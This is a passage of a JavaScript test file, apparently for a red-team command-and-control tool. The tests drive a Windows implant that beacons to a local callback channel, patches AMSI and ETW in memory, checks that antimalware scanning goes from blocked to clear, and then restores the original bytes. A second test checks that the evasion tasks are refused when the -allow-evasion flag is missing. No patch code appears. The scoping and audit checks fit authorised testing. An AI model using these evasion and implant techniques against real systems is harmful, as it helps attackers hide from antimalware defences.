    // 6. RESTORE (empty data = whatever the host process has patched): original bytes
    //    back, re-verified, the amsi flip-BACK measured (clear -> blocked).
    const re = await taskResult('evasion-restore', '', 'evasion-restore');
    assert.equal(re.parsed.state, 'restored', JSON.stringify(re.parsed.techniques));
    const amsiRe = re.parsed.techniques.amsi;
    assert.equal(amsiRe.restoreVerified, true, 'restore re-read == the snapshot');
    assert.equal(amsiRe.restoredSha256, amsiEn.originalSha256, 'the restored region hashes EXACTLY to the pre-patch original');
    assert.equal(amsiRe.verify.after, 'blocked', 'the flip-back is measured: clear -> blocked');
    assert.equal(amsiRe.verify.flipBackProven, true);
    assert.equal(re.parsed.techniques.etw.restoreVerified, true);
    const evRe = parseEvasionEvidence(re.body);
    assert.equal(evRe.event, 'evasion.restored');
    assert.equal(evRe.fields.techniques.amsi.restoreVerified, true);
    assert.ok(events.some((e) => e.type === 'evasion.restored'), 'the intake audited the restore from the Go evidence JSON');

    // 7. STATUS after restore closes the loop: aggregate 'restored'.
    const st2 = await taskResult('evasion-status', '', 'final evasion-status');
    assert.equal(st2.parsed.state, 'restored');
    console.log('  MEASURED native evasion chain (rundll32 pid ' + child.pid + '): amsi ' +
      amsiEn.verify.before + ' -> ' + amsiEn.verify.after + ' -> ' + amsiRe.verify.after +
      ' (flips proven) · etw byte+noop-probed · restore hash == original hash · evidence parsed by engine/evasion.mjs UNCHANGED');
  } finally {
    try { if (child) child.kill(); } catch {} // the host dies; anything still patched would die with it (in-memory only)
    await ch.disarm();
  }
});

test('native agent: evasion double gate — without -allow-evasion the kinds REFUSE loudly (agent half, exe form)', { skip: !GUARD, timeout: 120000 }, async (t) => {
  if (process.platform !== 'win32') return t.skip('windows-only');
  process.env.VARVEL_SETTINGS_FILE = join(TMP_ROOT, 'native-it-evasion-gate-' + Date.now() + '.json');
  const eng = 'native-it-evasion-gate-' + Date.now();
  Settings.for(eng).set('exec.evasion', true); // channel half OPEN — the agent half alone decides
  const events = [];
  const ch = new CallbackChannel({ scope: { engagement: eng, signedBy: 'test', cidrs: ['127.0.0.0/8'] }, onEvent: (ty, o) => events.push({ type: ty, ...o }) });
  const { port } = await ch.arm(0);
  const dir = mkdtempSync(join(TMP_ROOT, 'native-it-evgate-'));
  let child = null;
  try {
    const { agentId, token } = ch.registerAgent({ label: 'native-it-evgate' });
    child = spawn(BINARY, [
      '-url', `http://127.0.0.1:${port}`, '-id', agentId, '-token', token,
      '-interval', '250', '-jitter', '100', '-dir', dir,
    ], { windowsHide: true }); // NO -allow-evasion — the default
    let stderr = '';
    child.stderr.on('data', (d) => { stderr += d; });
    await waitFor(() => {
      const v = ch.agentsView().find((a) => a.agentId === agentId);
      return v && v.checkins >= 1 ? v : null;
    }, { what: 'first check-in (gate-off agent)' });
    assert.match(stderr, /evasion OFF \(default/, 'the launch line reports the gate OFF honestly');
    for (const [kind, data] of [['evasion-enable', '{"techniques":["amsi"]}'], ['evasion-status', ''], ['evasion-restore', '']]) {
      const taskId = ch.task(agentId, kind, data);
      assert.ok(taskId, kind + ' queued (the channel half is open — the refusal is the AGENT\'s)');
      const r = await waitFor(() => ch.results(agentId, { taskId })[0], { what: kind + ' refusal' });
      assert.match(r.data, new RegExp('^' + kind + ' REFUSED: agent-side evasion is OFF'), 'loud refusal text');
      assert.match(r.data, /-allow-evasion/, 'the refusal names the missing flag');
      assert.equal(parseEvasionEvidence(r.data), null, 'a refusal is NOT evidence — the intake fabricates no audit event from it');
    }
    assert.ok(!events.some((e) => e.type === 'evasion.applied' || e.type === 'evasion.restored' || e.type === 'evasion.status'),
      'no evasion audit event without real evidence');
    assert.ok(events.filter((e) => e.type === 'result.received').length >= 3, 'the refusals ride the governed result path (loud, never a silent drop)');
  } finally {
    try { if (child) child.kill(); } catch {}
    await ch.disarm();
  }
});

test('teardown grace (win32)', { skip: !GUARD }, async () => { await sleep(500); });
